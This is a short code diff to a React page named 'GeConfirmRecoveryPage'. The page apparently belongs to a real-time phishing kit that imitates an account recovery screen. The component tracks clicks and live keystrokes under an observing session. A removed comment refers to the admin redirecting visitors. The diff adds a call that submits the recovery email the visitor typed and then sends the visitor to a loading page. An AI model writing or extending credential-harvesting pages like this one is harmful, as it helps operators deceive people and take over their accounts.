@@ -162,7 +162,8 @@ ${GE_SHELL_CSS}
 `;
 
 function GeConfirmRecoveryPage() {
-  const { trackClick, trackInput, sessionId, isObserve } = useGeTracking();
+  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
+    useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [recoveryEmail, setRecoveryEmail] = useState("");
   const [focused, setFocused] = useState(false);
@@ -211,7 +212,8 @@ function GeConfirmRecoveryPage() {
     e?.preventDefault();
     if (!canSend) return;
     trackClick("Send");
-    // Stay put — admin redirects (recovery email is live-typed; no submit spam)
+    trackSubmit("email", recoveryEmail.trim());
+    geNavigate("/ge/loading");
   };
 
   return (
